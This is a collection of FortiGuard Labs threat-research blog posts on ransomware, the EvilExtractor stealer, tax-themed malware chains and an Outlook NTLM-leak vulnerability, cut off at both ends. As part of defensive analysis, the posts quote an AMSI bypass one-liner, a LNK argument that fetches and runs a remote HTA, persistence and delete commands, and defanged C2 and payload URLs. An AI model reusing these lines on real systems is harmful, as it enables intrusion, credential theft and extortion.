hXXps://cornerstonebeverly[.]org/js/files/ntfonts/avena/ C2 hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery[.]txt Further payload download hXXp://144.91.72[.]17:8080/user_details C2 hXXp://144.91.72[.]17:8080/streamcmd?AV=Unknown&OS=6.1.7601.17932&Vesrion=1&detail=Wfstzepn_Admin C2 Extracted PDB Paths: File Path DUser.dll E:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\HTTP Arsanel\\Clinet\\app\\Release\\app.pdb windows,FortiGuards Labs,APT Campaign FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/clean-rooms-nuclear-missiles-and-sidecopy"
  },
  {
    "title": "Ransomware Roundup - UNIZA",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the UNIZA ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called UNIZA. Like other ransomware variants, it encrypts files on victims’ machines in an attempt to extort money. It uses the Command Prompt (cmd.exe) window to display its ransom message, and interestingly, it does not append the filename of the files it encrypts, making it more difficult to determine which files have been impacted. Information on the infection vector used by the UNIZA ransomware threat actor is not currently available however, the likely attack vector is via email as many ransomware variants are distributed that way. At the time of this research, there is no indication that UNIZA ransomware is widespread. UNIZA ransomware is a typical ransomware that encrypts files on compromised machines and demands a ransom payment for recovering the affected files. The ransomware targets all directories and files found under %userprofile% and Desktop for file encryption. Figure 1 displays the ransomware encryption code. Elements of this image are as follows: Instead of dropping a ransom note, it launches the Command Prompt and the ransom note gradually shows up as if the attacker is remotely typing the message. This may be a scare tactic to make victims believe that the attacker can remotely control their machine. The ransom message asks victims to contact the attacker via TikTok and demands 20 Euros worth of Bitcoin. As the ransom fee is relatively low, we believe the UNIZA ransomware threat actor is targeting consumers. At the time of our research, theattacker’s Bitcoin wallethas not recorded a single transaction, which means that no victims have yet fallen prey to this ransomware. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known UNIZA ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. SHA256 Malware eefa1271d1a2a937d0baa3f0c7d904941151d6c8f915aed4dd51f10fa5d09b2a UNIZA ransomware d9a3f2ad7cfc6989cc4da117d5a4f8097362aad6b91391e89746d68d8d7aa29f UNIZA ransomware 9092ef0beeef1b147c13da3f3259f4a075f3bfb2414c39f9108395435ac9887c UNIZA ransomware Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-uniza-coverage"
  },
  {
    "title": "EvilExtractor – All-in-One Stealer",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices. It includes several modules that all work via an FTP service. It was developed by a company named Kodex, which claims it is an educational tool. However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer. Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023. FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog. It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities. It also contains environment checking and Anti-VM functions. Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker’s FTP server. We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America. The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module. This article will examine the initial attack method used to deliver EvilExtractor and its functions. The phishing email with the malicious attachment is shown in Figure 2. It is disguised as an account confirmation request. The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file. The PE header is shown in Figure 3. The execution file is a Python program packaged by PyInstaller. We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected. We extracted the key and iv from _pytransform.dll and decrypted the “contain.pyc” using AES-GCM. In addition to the Python program, we observed a .NET loader that can extract EvilExtractor. Figure 5 is part of the code. It contains Base64-encoded data, which is a PowerShell script. This execution file is generated from the tool “PS2EXE-GUI”, which can convert PowerShell scripts to EXE Files. After decrypting the pyc file, we get the primary code of EvilExtractor. It is a PowerShell script that contains the following modules: It first checks whether the system’s date is between 2022-11-09 and 2023-04-12. If not, it uses the following command to delete the data in PSReadline and terminate: DEL \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\*\\\" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6. It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data. These files are also Python programs that are obfuscated using PyArmor. The first is “KK2023.zip”, which is used for stealing browser data and saving it in the folder “IMP_Data”. It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox. It also collects browser history and passwords from the following browsers: The second file is “Confirm.zip”. It is a key logger that saves data in the “KeyLogs” folder. The last file, “MnMs.zip”, is a webcam extractor. Its corresponding code is shown in Figure 8. EvilExtractor also collects system information by PowerShell script, shown in Figure 9. Figure 10 shows the concatenated data in a text file called “Credentials.txt”. EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html. It also uses the command “CopyFromScreen” to capture a screenshot. The code is shown in Figure 11. After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker’s FTP server, shown in Figure 12. The developer of EvilExtractor also provides an FTP server for those who purchase its malware. EvilExtractor also has a ransomware function. It is called “Kodex Ransomware”, as shown in Figure 13. We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. It downloads “zzyy.zip” from evilextractor[.]com. Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14. Figure 15 shows it leverages “7za.exe” to encrypt files with the parameter “-p”, which means zipping files with a password. It also generates a ransom-demanding message saved in “KodexRansom”, shown in Figure 16. EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware. Its PowerShell script can elude detection in a .NET loader or PyArmor. Within a very short time, its developer has updated several functions and increased its stability. This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script. We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works. Users should be aware of this new info stealer and continue to be cautious about suspicious mail. The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor.A!trW32/Infostealer.A!trW32/Keylogger.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 45[.]87[.]81[.]184193[.]42[.]33[.]232 352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d attack research,email phishing,infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer"
  },
  {
    "title": "Ransomware Roundup – Kadavro Vector Ransomware",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Kadavro Vector ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a ransomware named “Kadavro Vector”, a NoCry ransomware variant that encrypts files on compromised machines and demands a ransom in Monero (XMR) cryptocurrency for file decryption. Recent variants of the Kadavro Vector ransomware are distributed as a fake Tor browser installer and include a Tor browser icon named “torbrowser-install-win64-12.0.4_ALL.exe”. Once the Kadavro Vector ransomware is executed, it encrypts files on compromised machines and appends a “.vector_” extension to them. The Kadavro Vector ransomware then drops an interactive ransom note on the victim’s desktop and demands $250 worth of Monero for file decryption. Although the ransom note is available in English and Russian in the screenshot below, scrolling down the left pane reveals it is also available in Norwegian. This likely means that the attacker is primarily targeting regions where those languages are used. To date, public submissions of Kadavro Vector ransomware samples have been made from the U.S., Russia, and Kazakhstan. Clicking “Show Encrypted Files” creates a pop-up window with a list of the files the ransomware has encrypted, likely to add pressure on victims by showing the number of affected files that will not be recovered unless a ransom is paid. Another pop-up window with the attacker’s email address is displayed upon clicking “Contact Us”. Victims are given four attempts to correctly enter a decryption key that is supposedly provided after the ransom is paid. The decryption screen warns that the encrypted files will be lost after four attempts. Based on traits found in the recent Kadavro Vector ransomware, we were able to trace it back to an older variant (SHA2: b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182) from early 2023, which may be the initial variant that calls itself “Kadavro”. The older Kadavro Vector variant encrypts files (including itself) on compromised machines, just like in recent samples. This older variant appends a “.tor” extension instead of the “.vector_” extension used by current variants. b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182 also replaces the desktop wallpaper. While we did not observe the Kadavro ransomware dropping a ransom note in our testing, it is visible in its code. The ransom note references “Anon Vector”, which is likely another ransomware that the threat actor previously used or at least tried to use. We also discovered another ransomware called “Kadavro” (SHA2: b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533) that was submitted to a public submission portal a week earlier. Since both Kadavro samples were submitted from the U.S. and Russia, and the submission dates are close, the same threat actor may be involved. The ransom note dropped by b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533 is available only in English and demands $160 worth of Monero from victims for file decryption. Furthermore, one of the recent Kadavro Vector samples refers to a Pastebin page for a ngrok address. \"ngrok” is a legitimate easy-to-usereverse proxy toolthat allows developers to expose local services to the internet. Unfortunately, threat actors often abuse ngrok’s tunneling capabilities for Command-and-Control (C2) communication. Based on the Pastebin page address, we found other malware potentially used by the same threat actor. Some of the samples are XWorm, a Remote Access Trojan (RAT) with ransomware capabilities. This may indicate that the Kadavro Vector ransomware threat actor tried other malware that supports file encryption. The Kadavro Vector ransomware variants described in this report are detected and blocked by FortiGuard Antivirus as: Other malware potentially used by the same threat actor are detected with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are protected. File-based IOCs: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware today is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-kadavro-vector-ransomware"
  },
  {
    "title": "Deja Vu All Over Again: Tax Scammers at Large",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:Medium The time has come again for tax returns—and tax-based scams. Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. This blog covers a few examples of malware that take advantage of tax season. Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed. The zip file contains the following files: The XLSX file is a benign decoy file that contains financial data from an unknown source. The other file is malicious. Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems. The file is actually a link (LNK) file that launches the legitimate script (C:\\Windows\\System32\\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments. The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\\W_\\*2\\\\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.'+'hta') The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation. Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. note.gif is a PowerShell script that creates the following files: Once launched, it executes the onedrive.vbs and test.vbs files. test.vbs creates %usertemp%\\Note.txt, a clean file containing fake \"QUARTERLY TAX PAYMENTS FOR 2022\" data. onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender. It first executes the following known AMSI (Antimalware Scripting Interface) bypass: [Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’) .GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\". The PowerShell script then performs the following actions to alter Windows Defender settings: The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. Furthermore, we discovered other files that follow a similar attack pattern; “Mary tax docs.pdf.lnk” (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and “Wilson tax_docs.pdf.lnk” (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023. As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. “Mary tax docs.pdf.lnk”, along with another clean Microsoft Office file, “R&P Sales Summary.docx”, are included in an archived file labeled “2022 tax docs.zip”. Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”. The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”. While the “a.mp3” is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim’s machine. From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150. XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC). XWorm can also encrypt files, essentially acting in a similar fashion to ransomware. Here are screenshots of a recently cracked version of XWorm v3.1: Going back to the first example, “2022%20tax_documents[.]zip”, we found that it was hosted on the open directory “www[.]farmaciasmv[.]com/citrix/”. We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html. The files involved in this attack were submitted to VirusTotal. We don’t believe victims just wander into such malicious sites by accident. Based on our experience, they were likely lured via malicious links in spam emails. Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run. The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. Another tax-related attack FortiGuard Labs came across is an image file named “TaxReturn2022.img” (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: We were able to locate another file, “TaxReturns2022.iso” (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files. Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted. As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon. However, it’s a link (shortcut) file, as seen in Figure 4.  Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1). The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code. It eventually runs: powershell.exe -ExecutionPolicy UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded. In this case, it downloads “TaxReturn2022.pdf” from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\\TaxReturn2022.pdf, and opens it. Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open. The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo = [location of downloaded PDF file] This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs. The script then sleeps five seconds before downloading and executing whatever has been downloaded. In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d). Note that part of the IP address masked as the directory is accessible. TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07). no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1. The .ps1 file contains two PE files (stored in $apprun and $appme). It uses 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2). This link file goes through the same infection chain as the previous one: qDxcmqPPmI.wsf was not available at the time of the investigation. However, OSINT led us to find the next action. Curiously the attacker left the hosting location of the malicious files wide open. The directory contains a few files whose names are associated with Adobe Acrobat Reader DC. This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes. But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain. A little caution can go a long way toward protecting yourself against tax-related malware. The attacks covered in this blog are the tip of the iceberg. Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks. In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world. For additional information, please refer to the “Tax Scams/Consumer Alerts” alert issued by the IRS for other tips on protecting yourself from tax-related scams. FortiGuard AntiVirusdetects the malicious files identified in this report with the following signatures: The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web Filtering Servicedetects the download URLs cited in this report as Malicious and blocks them. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. File IOCs: tax refund,FortiGuards Labs,taxes,threat actors,remote access trojan Industry Trends FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/tax-scammers-at-large"
  },
  {
    "title": "Exploring a Recent Microsoft Outlook Vulnerability: CVE-2023-23397",
    "content": "FortiGuard Labs Threat Research FortiGuard Labsrecently investigated an Elevation of Privilege vulnerability in Microsoft Outlook that can be exploited by sending a crafted email to a vulnerable version of the software. When the victim receives the email, an attempt to connect to an attacker’s device is triggered, resulting in the victim’s NTLMv2 hash being leaked. The vulnerable property resides in the PidLidReminderFileParameter extended MAPI property, which specifies the filename of a sound to be played when a reminder for an object is overdue. To trigger the vulnerability, the sender simply modifies the PidLidReminderFileParameter message property to point to a malicious UNC path in a calendar or task item invite. To replicate this vulnerability, we used the Outlook AppointmentItem object to customize a malicious appointment email in the Calendar folder. No interaction from the recipient is required. Upon receipt of the email, an automatic reminder pop-up appears on the recipient’s device that triggers NTLM authentication behind the scenes. A request to access the UNC path via SMB to an untrusted network is initiated. To obtain the NTLMv2 hash of the recipient during authentication, a MitM (Man in the Middle) attack can be set up to concurrently listen to and poison incoming requests. Using NTLM authentication, a bad actor can then use the exposed hashes to elevate their privileges in other systems, potentially gaining control of services unbeknownst to the email recipient. Microsoft has released ascriptthat checks for the presence of the PidLidReminderFileParameter message property in Exchange messaging items. This script provides the option to sanitize or fully remove items containing the vulnerable parameter. Microsoft has also released anadvisoryfor CVE-2023-23397 outlining the latest security updates. All users with a vulnerable version of Microsoft Outlook are encouraged to patch their systems immediately. FortiGuard AntiVirusdetects the malicious files identified in this report as: FortiGuard IPSprotects organizations with the following signature: The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient,FortiEDR,andFortiProxy. The FortiGuard IPS service is supported byFortiGate. Customers running up-to-date versions of these products are protected. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. This threat is delivered as an email attachment.FortiMailandFortiSandboxcan detect and quarantine malicious attachments for such campaigns. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. vulnerabilities,cve,outlook FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/exploring-recent-microsoft-outlook-vulnerability-cve-2023-23397"
  },
  {
    "title": "Are Internet Macros Dead or Alive?",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Potential to deploy additional malware for additional purposesSeverity level:Medium In early February of 2022,Microsoft announcedthat Internet Macros would be blocked by default to improve the security of Microsoft Office.According to their blogpublished in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023. Office uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro. Since that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads. The most common method employed by several cybercrime and nation-state actors is using ISO image files that usually contain a .lnk file and a dll payload to distribute their malware. In this method, the victim must execute the .lnk file, which leads to executing the dll file – commonly either a malicious payload or a downloader that grabs the next-stage payload. These ISO images are either directly attached to a spam/phishing email or have been dropped using other methods, like html smuggling, in which an html file is attached to the spam/phishing email, and by opening it, a malicious ISO file is dropped in the victim’s machine. We covered these techniques in blogs last year,hereandhere. Even though several cyber threat actors have adopted TTPs to not use Office macros, we have observed several threat actors still relying on Office macros to initiate their attacks. In this blog post, we provide an overview of some of the interesting Office macro-embedded documents we observed early this year (some of these activities have already been reported on by security researchers on Twitter). It is worth mentioning that while some of the threat actors had multiple activities, we only cover one of them as an example in the post. But we added all the related IOCs in the IOC (Indicator of Compromise) section at the end of this blog. Emotet is a modular malware launched into the wild around 2014, operating as a banking malware in an organized botnet. But nowadays, Emotet mainly operates as a downloader for additional payloads such as IcedId, eventually deploying ransomware. Emotet has adopted .lnk files as one of its distribution methods, using this method in mid-2022. OnMarch 7of this year, Emotet is back in operation, and this time the actor is using malicious documents to spread Emotet. In this new campaign, malicious documents weaponized with macros are embedded in an archive file and used as attachments in spam emails. The lure they use is well-known, having been employed by these threat actors in their previous campaigns. This is not the only template used in this campaign. We also observed that the actor had used another template to distribute Emotet. All the URLs, strings, and file names are encoded in the macro. It also includes a decoder function to decode these strings. The decoder function receives three arguments: a hardcoded string, an array of numbers that 